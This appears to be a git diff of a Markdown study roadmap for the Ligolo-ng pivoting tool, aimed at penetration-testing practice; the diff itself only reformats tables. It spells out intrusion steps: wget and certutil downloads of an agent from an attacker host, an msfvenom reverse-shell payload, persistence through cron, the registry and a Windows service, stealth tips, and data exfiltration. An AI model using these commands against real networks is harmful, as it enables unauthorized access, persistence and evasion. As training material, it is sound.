@@ -19,17 +19,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | Pivoting & Tunneling | Post-Exploitation & PrivEsc | C2 Frameworks | Network Relays |
-|:---------------------|:----------------------------|:--------------|:---------------|
+| :--------------------- | :---------------------------- | :-------------- | :--------------- |
 | [[Chisel\|🔀 Chisel]] | [[LinPEAS\|🐉 LinPEAS]] | [[Sliver\|🐍 Sliver]] | [[Netcat\|🔌 Netcat]] |
 | **🔀 Ligolo-ng** (you are here) | [[WinPEAS\|🪟 WinPEAS]] | [[Havoc\|⚔️ Havoc]] | [[socat\|🔄 socat]] |
-| | [[Mimikatz\|🐱 Mimikatz]] | [[Mythic\|🏛️ Mythic]] | [[Metasploit_Framework\|💀 Metasploit]] |
+|| [[Mimikatz\|🐱 Mimikatz]] | [[Mythic\|🏛️ Mythic]] | [[Metasploit_Framework\|💀 Metasploit]] |
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 4 | 1–2 hours |
 | 2 | Setup | 5 | 2–3 hours |
 | 3 | Basic Pivoting | 4 | 2–3 hours |
@@ -38,7 +38,7 @@
 | 6 | Integration | 3 | 1–2 hours |
 | 7 | Practical Labs | 4 | 4–6 hours |
 | 8 | Mastery Challenges | 3 | 3–5 hours |
-| | **Total** | **30** | **~18–28 hours** |
+|| **Total** | **30** | **~18–28 hours** |
 
 **Prerequisites:** TCP/IP routing concepts (subnets, gateways, routing tables). Understanding of what pivoting is and why it's needed. Linux TUN/TAP interface basics.
 
@@ -53,7 +53,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scenario** | Attacker can reach `192.168.1.0/24`. Compromised machine on `192.168.1.50` also has a NIC on `10.10.0.0/24` — the internal network. Attacker cannot reach `10.10.0.0/24` directly. |
 | **Pivot** | Use the compromised machine as a jump point. Traffic from attacker → tunneled through compromised machine → exits into `10.10.0.0/24`. |
 | **Goal** | Treat `10.10.0.0/24` as directly reachable from the attacker's machine. |
@@ -65,7 +65,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Proxy** | Runs on the attacker's machine. Creates a TUN interface. Listens for incoming agent connections. |
 | **Agent** | Runs on the compromised machine. Connects outbound to the proxy. Routes traffic between the proxy's TUN interface and the internal network. |
 | **TUN Interface** | Virtual network interface (`ligolo`) created on the attacker's machine. Traffic routed to this interface → tunneled through the agent → reaches the internal network. |
@@ -78,7 +78,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **SSH -D** | SOCKS proxy via SSH. Simple but requires SSH access. ProxyChains needed. No UDP. |
 | **Chisel** | SOCKS5 or port forwarding via HTTP tunnel. Good for web-based pivoting. ProxyChains needed. |
 | **Ligolo-ng** | TUN interface — native routing. All protocols. No ProxyChains. Fastest and most transparent. Best choice for complex pivoting scenarios. |
@@ -90,7 +90,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **GitHub** | `github.com/nicocha30/ligolo-ng/releases`. |
 | **Files** | `proxy` — runs on attacker (Linux). `agent` — runs on target (Linux or Windows: `agent.exe`). |
 | **Self-contained** | Both are single static binaries. No dependencies. Transfer agent to compromised host. |
@@ -106,7 +106,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Create Interface** | `sudo ip tuntap add user $(whoami) mode tun ligolo`. |
 | **Bring Up** | `sudo ip link set ligolo up`. |
 | **Verify** | `ip a show ligolo` — should show the interface up. |
@@ -119,7 +119,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `./proxy -selfcert -laddr 0.0.0.0:11601`. |
 | **Flags** | `-selfcert` — auto-generate TLS cert (no need for real cert in labs). `-laddr 0.0.0.0:11601` — listen on all interfaces, port 11601. |
 | **Custom Cert** | `-certfile cert.pem -keyfile key.pem` — for use in engagements with proper certs. |
@@ -132,7 +132,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Transfer** | `python3 -m http.server 8080` on attacker. `wget http://attacker_ip:8080/agent -O /tmp/agent && chmod +x /tmp/agent` on target. Or: `certutil -urlcache -split -f http://attacker_ip:8080/agent.exe agent.exe` (Windows). |
 | **Run (Linux)** | `./agent -connect attacker_ip:11601 -ignore-cert` (lab, self-cert). |
 | **Run (Windows)** | `agent.exe -connect attacker_ip:11601 -ignore-cert`. |
@@ -145,7 +145,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Select Session** | In proxy shell: `session` → shows connected agents → select number. |
 | **Start Tunnel** | `start` — starts the tunnel on the TUN interface. |
 | **Add Route** | `sudo ip route add 10.10.0.0/24 dev ligolo` — route the internal network through the TUN interface. |
@@ -158,7 +158,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Remove Route** | `sudo ip route del 10.10.0.0/24 dev ligolo`. |
 | **Stop Session** | In proxy shell: Ctrl+C or `stop`. |
 | **Remove Interface** | `sudo ip link del ligolo` — if needed (or just leave for the session). |
@@ -174,7 +174,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Direct Nmap** | `nmap -sV 10.10.0.0/24` — runs directly on attacker, reaches internal network via ligolo TUN. No ProxyChains needed. |
 | **Speed** | As fast as native network scanning — ligolo-ng is fast. |
 
@@ -185,7 +185,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Web** | `curl http://10.10.0.100` or open browser → `http://10.10.0.100`. Works natively. |
 | **SMB** | `nxc smb 10.10.0.0/24 -u admin -p pass` — direct, no proxy. |
 | **WinRM** | `evil-winrm -i 10.10.0.100 -u admin -p pass`. |
@@ -198,7 +198,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Setup** | With ligolo route in place, internal IPs are directly routable. |
 | **Metasploit** | Just point to the internal IP: `set RHOSTS 10.10.0.100`. No additional proxy config needed. |
 | **Listener** | For reverse shells from internal hosts back to attacker: use a listener add. |
@@ -210,7 +210,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Problem** | Internal host needs to connect back to attacker. Internal host can't reach the attacker's IP directly (different network). |
 | **Solution** | `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444` — in proxy shell. Agent listens on port 4444 on the compromised host. Forwards to attacker's 127.0.0.1:4444. |
 | **Payload** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<compromised_host_ip> LPORT=4444 -f exe > shell.exe`. Internal host → connects to compromised host:4444 → forwarded to attacker's listener. |
@@ -226,7 +226,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | In proxy shell: `listener_add --addr 0.0.0.0:LPORT --to 127.0.0.1:LPORT`. |
 | **Effect** | Agent machine listens on `LPORT`. Connections forwarded through tunnel to attacker's `127.0.0.1:LPORT`. Allows internal hosts (which can see the compromised host but not the attacker) to reach attacker's services. |
 
@@ -237,7 +237,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scenario** | Compromised host has 3 NICs: `192.168.1.50`, `10.10.0.5`, `172.16.5.100`. All three networks accessible via the tunnel. |
 | **Add Routes** | `sudo ip route add 10.10.0.0/24 dev ligolo`. `sudo ip route add 172.16.5.0/24 dev ligolo`. Both networks now reachable. |
 
@@ -248,7 +248,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Linux Persistence** | Add to crontab: `@reboot /tmp/agent -connect attacker_ip:11601 -ignore-cert`. |
 | **Windows** | Register as scheduled task or service. Or add to `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. |
 | **Risk** | Persistence is noisy — use only when explicitly in scope and authorized. |
@@ -260,7 +260,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Create Service** | `sc create ligolo-agent binPath= "C:\Windows\Temp\agent.exe -connect attacker_ip:11601 -ignore-cert" start= auto`. `sc start ligolo-agent`. |
 | **Stealth** | Use a benign service name. Move agent to a less-obvious path. Sign with a code signing cert if available. |
 
@@ -275,7 +275,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scenario** | Attacker → Pivot1 (10.10.0.5) → Pivot2 (172.16.5.10) → internal DC (192.168.100.1). |
 | **Approach** | Pivot1 has ligolo agent → tunnel to attacker. Route `10.10.0.0/24` and `172.16.5.0/24` through Pivot1 agent. Reach Pivot2 (172.16.5.10) from attacker. Deploy second ligolo agent on Pivot2. But agent needs to connect to attacker — use listener_add on Pivot1 to forward the connection. |
 
@@ -286,7 +286,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Approach** | After establishing first pivot: run Nmap through it to discover dual-homed machines. `nmap -sV -p 80,443,22,3389,445 172.16.5.0/24`. Identify new pivot candidates. Repeat. |
 
 ---
@@ -296,7 +296,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Chain** | For each hop: set up a listener_add on the previous pivot's agent → forward connections to the next pivot's agent connect port. Each new compromised machine's agent connects to the previous machine → chains through to attacker. |
 
 ---
@@ -310,7 +310,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Workflow** | Route internal web server through ligolo. Open Burp. Intercept: `http://10.10.0.100`. No proxy needed for browser — ligolo handles routing. |
 | **FoxyProxy** | Point browser at Burp proxy. Route internal traffic through ligolo. Manual testing of internal web apps via Burp. |
 
@@ -321,7 +321,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Workflow** | `nxc ldap 10.10.0.10 -u user -p pass --bloodhound` — collects via ligolo tunnel. Or: run SharpHound.exe on a compromised host, exfiltrate via listener_add, import into BloodHound. |
 
 ---
@@ -331,7 +331,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Direct** | Set RHOSTS to internal IP. Works natively via ligolo routing. |
 | **Handlers** | Set up listener_add for reverse shells. msfconsole handler on attacker machine. `set LHOST 0.0.0.0`. Internal hosts connect to compromised host → forwarded to attacker. |
 
@@ -411,7 +411,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can set up the TUN interface and start the proxy | ☐ |
 | Can transfer and run the agent on Linux and Windows | ☐ |
 | Can start a tunnel and add routing for an internal subnet | ☐ |
